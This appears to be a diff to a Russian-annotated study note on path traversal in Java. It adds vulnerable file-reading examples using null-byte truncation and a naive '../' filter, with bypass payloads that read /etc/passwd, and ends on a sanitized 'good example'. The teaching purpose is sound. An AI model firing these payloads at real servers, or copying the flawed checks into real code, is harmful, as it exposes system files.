@@ -80,7 +80,44 @@ String fileName = queryParams.get(URL_PARAM_KEY);
 Обход:
 1) %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ------------------------------------------------------------------------------------------------------------------------
+## EXAMPLE 6:
 
+-> fileName=../../../../../../../../../../../../etc/passwd%00UserInfo.json
+-> String NULL_BYTE_CHARACTER = String.valueOf((char) 0);
+
+String queryFileName = queryParams.get(URL_PARAM_KEY); //get http://localhost/PATH/?fileName=[payload]
+        String fileName = null;
+        if (queryFileName != null) {
+            int indexOfNullByte = queryFileName.indexOf(NULL_BYTE_CHARACTER); //find index of null byte (%00)
+            fileName =
+                    indexOfNullByte >= 0 // если indexOfNullByte больше 0 выполнять условие
+                            ? queryFileName.substring(0, indexOfNullByte) //вырезать данные начиная с индекса 0 до индекса null byte
+                            : queryFileName;
+        }
+------------------------------------------------------------------------------------------------------------------------
+## EXAMPLE 7:
+String queryFileName = queryParams.get(URL_PARAM_KEY);
+        String fileName = null;
+        if (queryFileName != null) {
+            int indexOfNullByte = queryFileName.indexOf(NULL_BYTE_CHARACTER);
+            fileName =
+                    indexOfNullByte >= 0
+                            ? queryFileName.substring(0, indexOfNullByte)
+                            : queryFileName;
+        }
+        return this.readFile(
+                () ->
+                        queryFileName != null
+                                && !requestEntity.getUrl().toString().contains("../")
+                                && ALLOWED_FILE_NAMES.stream()
+                                        .anyMatch(
+                                                allowedFileName ->
+                                                        queryFileName.contains(allowedFileName)),
+                fileName);
+                
+Обход: 
+1) %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00UserInfo.json
+------------------------------------------------------------------------------------------------------------------------
 ## GOOD EXAMPLE 1:
 public Response getImage(@javax.ws.rs.PathParam("image") String image) {
     File file = new File("resources/images/", FilenameUtils.getName(image)); // <-- image is now sanitized
